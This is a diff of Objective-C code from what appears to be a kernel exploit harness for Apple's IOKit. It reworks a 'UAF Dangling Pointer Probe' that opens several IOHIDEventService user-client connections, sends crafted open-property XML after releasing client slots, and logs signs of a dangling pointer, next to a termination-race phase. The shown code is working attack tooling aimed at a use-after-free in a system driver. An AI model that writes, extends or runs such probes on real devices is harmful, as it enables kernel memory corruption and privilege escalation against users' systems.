@@ -3976,31 +3976,31 @@ static const char kOpenPropertiesGarbage[] =
             @"\n  Released %d/%d multi-conn client slots", released, connCount]];
     }
 
-    // ---- Probe: open NEW connection to same provider after UAF ----
+    // ---- Probe: try 3 DIFFERENT IOHIDEventService instances ----
     [self appendLog:@"\n====== UAF Dangling Pointer Probe ======"];
-    io_service_t probeSvc = sIOServiceGetMatchingService(0,
-        sIOServiceMatching("IOHIDEventService"));
-    [self appendLog:[NSString stringWithFormat:@"  IOHIDEventService: 0x%x", probeSvc]];
-    if (probeSvc != MACH_PORT_NULL) {
-        for (int p = 0; p < 5; p++) {
+    for (int inst = 0; inst < 3; inst++) {
+        io_service_t svc = sIOServiceGetMatchingService(0,
+            sIOServiceMatching("IOHIDEventService"));
+        [self appendLog:[NSString stringWithFormat:@"  Instance %d: 0x%x", inst, svc]];
+        if (svc == MACH_PORT_NULL) break;
+        for (int p = 0; p < 3; p++) {
             io_connect_t pc = MACH_PORT_NULL;
-            kern_return_t okr = sIOServiceOpen(probeSvc, mach_task_self(), 2, &pc);
-            [self appendLog:[NSString stringWithFormat:@"  [%d] IOServiceOpen=0x%x", p, okr]];
+            kern_return_t okr = sIOServiceOpen(svc, mach_task_self(), 2, &pc);
             if (okr == KERN_SUCCESS && pc != MACH_PORT_NULL) {
                 uint64_t s = 0;
                 kern_return_t gkr = sIOConnectCallMethod(pc, kSelectorOpen,
                     &s, 1, kOpenPropertiesXML, strlen(kOpenPropertiesXML) + 1,
                     NULL, NULL, NULL, NULL);
-                NSString *status = (gkr == KERN_SUCCESS) ? @" (provider alive)" : @"";
-                [self appendLog:[NSString stringWithFormat:@"  [%d] gate=0x%x%@", p, gkr, status]];
+                [self appendLog:[NSString stringWithFormat:@"    conn[%d] gate=0x%x%s", p, gkr,
+                    (gkr == KERN_SUCCESS) ? " (PASS)" : "")];
                 if (gkr != KERN_SUCCESS)
-                    [self appendLog:@"  >>> Dangling pointer may have caused fault - check crashlog"];
+                    [self appendLog:@"    >>> provider may have dangling ptr"];
                 sIOServiceClose(pc);
             } else {
-                break; // All slots full or error
+                [self appendLog:[NSString stringWithFormat:@"    IOServiceOpen=0x%x", okr]];
             }
         }
-        sIOObjectRelease(probeSvc);
+        sIOObjectRelease(svc);
     }
 
     // ---- Dedicated Termination Race Phase (Batch Pre-Gating) ----
